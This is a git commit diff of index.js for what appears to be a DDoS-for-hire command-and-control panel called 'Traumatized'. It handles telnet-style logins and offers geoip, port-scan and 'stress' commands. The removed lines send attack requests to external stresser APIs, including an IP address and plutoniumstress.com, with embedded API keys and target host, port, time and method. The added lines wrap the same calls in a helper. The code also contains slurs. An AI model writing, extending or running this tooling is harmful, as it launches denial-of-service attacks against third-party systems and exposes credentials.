f5c35470cbe8ec1c14070c38fe9a5fe907222813
Devious <74839733+DeviousTheDev@users.noreply.github.com>
2021-01-24 17:49:58 -0500

    Update index.js

--- index.js
+++ index.js
@@ -11,6 +11,7 @@ const config = require("./config/strings.js");
 const crud = require("./auth/crud.js");
 const auth = require("./auth/login.js");
 const banners = require("./extra/banners.js");
+const func = require("./extra/functions");
 
 const sleep = (milliseconds) => {
     return new Promise(resolve => setTimeout(resolve, milliseconds))
@@ -23,7 +24,7 @@ server.listen(port, function() {
 });
 
 server.on('connection', function(socket) {
-    //set_title("Welcome To Scrapy's CNC!", socket);
+    set_title("Traumatized | [API]: 3 | [Total Users]: " + func.stats("users") + " | [Total Online Users]: " + func.stats("current"), socket);
     socket.write(config.Colors.Clear);
     socket.write(banners.main() + config.Colors.Purple + "                            Traumatized Login Screen\r\n" + config.Colors.Black);
     console.log("A new connection has been established");
@@ -35,8 +36,6 @@ server.on('connection', function(socket) {
     socket.on('data', async function(chunk) {
         //Cleaning data
         let cleanSTR = chunk.toString().replace(/(\r\n|\n|\r)/gm,"");
-
-        //set_title("Scrapy's CNC! | APIs: 4", socket);
 
         /*
         Command handler
@@ -58,71 +57,58 @@ server.on('connection', function(socket) {
         /*
         Main Functions
         */
-        let user_name = crud.user(socket_ip, "username");
+        let user_name = crud.GetCurrentUsername(socket_ip);
+        set_title("Traumatized | [API]: 3 | [Total Users]: " + func.stats("users") + " | [Total Online Users]: " + func.stats("current") + " | [Username]: " + user_name, socket);
         if(crud.isSignedIn(socket_ip) == true) {
             if(cleanSTR.startsWith("help")) {
                 socket.write("Coming soon.....");
             } else if(cleanSTR.startsWith("methods")) {
-                socket.write(config.Colors.Clear + banners.methods_list() + config.hostname(config.CurrentUser.Username));
+                socket.write(config.Colors.Clear + banners.methods_list() + config.hostname(user_name));
             } else if(cleanSTR.startsWith("geo")) {
                 let ip = config.CurrentCMD.arg[1];
-                f('https://scrapy.tech/tools/?action=geoip&q=' + ip).then(res => res.text()).then(body => {
-                    if(body) {
-                        socket.write(banners.geoBanner() + body + "\r\n"+ config.hostname(config.CurrentUser.Username));
-                    } else {
-                        socket.write("[x] Error, Couldn't fetch geo results\r\n" + config.hostname(config.CurrentUser.Username))
-                        console.log("[x] Error, Couldn't fetch geo results")
-                    }
-                })
+                socket.write(await func.GeoIP(ip));
             } else if(cleanSTR.startsWith("pscan")) {
-                let ip = config.CurrentCMD.arg[1]
-                f('https://scrapy.tech/tools/?action=portscan&q=' + ip).then(res => res.text()).then(body => {
-                    if (body) {
-                        socket.write(body + "\r\n" + config.hostname(config.CurrentUser.Username));
-                        console.log(body);
-                    } else {
-                        socket.write("[x] Error. Couldn't fetch PortScanner results!\r\n" + config.hostname(config.CurrentUser.Username))
-                        console.log("[x] Error. Couldn't fetch PortScanner results!");
-                    }
-                })
+                let ip = config.CurrentCMD.arg[1];
+                socket.write(await func.pScan(ip));
+            } else if(cleanSTR.startsWith("stats")) {
+                
             } else if(cleanSTR.startsWith("clear")) {
-                socket.write(config.Colors.Clear + banners.main() + config.hostname(config.CurrentUser.Username))
-            } else if(cleanSTR.startsWith("skid")) {
-                socket.write(await config.autism());
+                socket.write(config.Colors.Clear + banners.main() + config.hostname(user_name))
             } else if(cleanSTR.startsWith("stress")) {
-                let ip = config.CurrentCMD.arg[1]
-                let port = config.CurrentCMD.arg[2]
-                let time = config.CurrentCMD.arg[3]
-                let method = config.CurrentCMD.arg[4]
-                f('http://50.115.166.121/api.php?key=skidfag3&host=' +ip + "&port=" + port + "&time=" + time + "&type=" + method).then(res => res.text()).then(body => {
-                    console.log(body);
-                    if(body.toLowerCase().includes("attack sent")) {
-                        socket.write("Attack Sent To " + ip + ":" + port + " for " + time + " seconds with " + method);
-                    }
-                })
-                f('https://plutoniumstress.com/api/api.php?key=zOv4QAaLO0WZayKu&vip=0&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
-                    console.log(body);
-                })
+                let host_ip = config.CurrentCMD.arg[1];
+                let host_port = config.CurrentCMD.arg[2];
+                let host_time = config.CurrentCMD.arg[3];
+                let host_method = config.CurrentCMD.arg[4];
+                socket.write(await func.send_attack(host_ip, host_port, host_time, host_method) + config.hostname(user_name));
             } else if(cleanSTR.startsWith("exit")) {
                 socket.write("Closing Traumatized.")
                 socket.write(config.Colors.Clear)
                 socket.write("Closing Traumatized..")
                 socket.write(config.Colors.Clear)
                 socket.write("Closing Traumatized...")
-                socket.close()
+                socket.destroy()
             } else {
-                socket.write("[x] Command not found!\r\n" + config.hostname(config.CurrentUser.Username));
+                socket.write("[x] Command not found!\r\n" + config.hostname(user_name));
             }
-        } else if(cleanSTR.startsWith("-")) {
+        } else if(cleanSTR.startsWith("-")) { //SIGN IN FUNCTION!!
+            /*
+            Stringing arguments from command
+            */
             let username = config.CurrentCMD.arg[0].replace("-", "");
             let pw = config.CurrentCMD.arg[1];
             let login_response = auth.login(username, pw, socket_ip);
+
+            /*
+            Auth checking
+            */
             if(login_response.includes("Successfully")) {
                 socket.write(config.Colors.Clear + banners.main() + config.Colors.Purple + "                  [+] " + login_response + "\r\n" + config.hostname(config.CurrentUser.Username));
             } else {
-                socket.write(config.Colors.Purple + "[x] " + login_response + "\r\n" + config.hostname(""));
+                socket.write(config.Colors.Clear + config.Colors.Purple + "[x] " + login_response + "\r\n" + config.hostname(""));
             }
         } else {
+
+            //THIS MESSAGE ONLY APPEAR WHEN USER INFO IS WRONG
             socket.write(config.Colors.Clear + config.Colors.Purple + "          Must login\r\nUsage: <username> <password>\r\n" + config.Colors.Black)
         }
     });
@@ -141,4 +127,9 @@ server.on('connection', function(socket) {
 
 function reset_sessions() {
     fs.writeFileSync(crud.current_path, "");
+}
+
+function set_title(string, socket)
+{
+    socket.write("\033]0;" + string + "\007")
 }
